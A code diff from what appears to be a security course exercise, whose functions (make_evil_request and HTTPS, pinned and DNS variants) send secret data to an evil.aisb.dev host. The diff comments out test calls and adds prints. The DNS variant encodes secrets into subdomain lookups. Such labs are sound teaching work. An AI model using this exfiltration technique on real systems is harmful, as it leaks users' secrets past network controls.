@@ -36,11 +36,11 @@ def make_evil_request(secret_data: str) -> Optional[str]:
         return None
 
 
-from w1d2_test import test_make_evil_request
+#from w1d2_test import test_make_evil_request
 
-test_make_evil_request(make_evil_request)
+#test_make_evil_request(make_evil_request)
 
-exfiltrate_data = make_evil_request
+#exfiltrate_data = make_evil_request
 # %%
 
 if __name__ == "__main__":  # Only executed when running the script directly
@@ -89,13 +89,13 @@ def make_evil_request_https(secret_data: str) -> Optional[str]:
         return None
 
 
-from w1d2_test import test_make_evil_request_https
+#from w1d2_test import test_make_evil_request_https
 
-test_make_evil_request_https(make_evil_request_https)
+#test_make_evil_request_https(make_evil_request_https)
 
 
 # Update the exfiltrate_data function to use HTTPS
-exfiltrate_data = make_evil_request_https
+#exfiltrate_data = make_evil_request_https
 
 # %%
 
@@ -132,11 +132,11 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
         return None
 
 
-from w1d2_test import test_make_evil_request_pinned
+#from w1d2_test import test_make_evil_request_pinned
 
-test_make_evil_request_pinned(make_evil_request_pinned)
+#test_make_evil_request_pinned(make_evil_request_pinned)
 
-exfiltrate_data = make_evil_request_pinned
+#exfiltrate_data = make_evil_request_pinned
 
 # %%
 
@@ -166,9 +166,11 @@ def make_evil_request_dns(secret_data: str) -> Optional[str]:
     encoded = base64.urlsafe_b64encode(bytes(secret_data, encoding="utf-8"))
     decoded = encoded.decode("utf-8")
     domain = f"{decoded}.evil.aisb.dev"
+    print("using dns exfiltrator")
 
     try:
         answer = resolver.resolve(domain, "TXT")
+        print(f"agent response: {answer[0].to_text()}")
         return answer[0].to_text()
     except Exception as e:
         print(e)
